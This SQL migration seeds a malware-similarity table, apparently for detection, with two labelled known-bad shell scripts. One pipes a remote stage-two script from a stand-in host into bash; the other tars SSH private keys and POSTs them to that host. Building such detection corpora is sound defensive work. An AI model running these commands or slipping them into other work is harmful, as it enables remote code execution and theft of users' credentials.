-- More approved similarity-corpus seeds, same pattern as 0003's. A new file
-- rather than an edit to 0003, which has already run on existing installs.
INSERT INTO known_bad_samples (content_hash, content, label, status, source, proposed_at, reviewed_at)
SELECT encode(sha256(c), 'hex'), c, l, 'approved', 'manual', now(), now()
FROM (
  VALUES
    (convert_to(E'#!/bin/bash\ncurl -fsSL http://203.0.113.7/stage2.sh | bash\n', 'UTF8'), 'curl_pipe_dropper'),
    (convert_to(E'#!/bin/bash\ntar czf - ~/.ssh/id_rsa ~/.ssh/id_ed25519 | curl -s -X POST --data-binary @- http://203.0.113.7/upload\n', 'UTF8'), 'ssh_key_exfil')
) AS seed(c, l)
ON CONFLICT (content_hash) DO NOTHING;
